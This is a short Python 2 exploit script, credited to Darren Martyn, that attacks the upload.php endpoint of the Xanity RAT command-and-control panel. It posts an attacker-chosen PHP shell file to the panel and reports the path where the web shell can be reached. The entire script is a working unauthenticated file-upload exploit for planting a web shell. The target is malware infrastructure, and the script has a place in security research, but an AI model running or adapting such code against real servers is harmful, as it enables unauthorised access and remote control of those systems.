#!/usr/bin/python2
# coding: utf-8
# Xanity RAT C&C Panel Shell Upload Exploit
# Written before coffee happened.
# Author: Darren Martyn
# Licence: WTFPL - wtfpl.net
import requests
import sys
import os

def upload_shell(url, shell):
    up_url = url + "?d=lol" # add "d" param
    try:
        files = {'file': open(shell, "rb")}
        r = requests.post(url=up_url, files=files)
    except:
        sys.exit("[-] failure")
    if "1" in r.text: # the next line is ugly as sin.
        print "[+] Shell Uploaded! It should be in: %s" %(url.replace("upload.php", "lol/%s" %(os.path.basename(shell))))


def main(args):
    if len(args) != 3:
        sys.exit("use: %s http://xanity.skids/upload.php /your/shell.php" %(args[0]))
    upload_shell(url=args[1], shell=args[2])

if __name__ == "__main__":
    main(args=sys.argv)
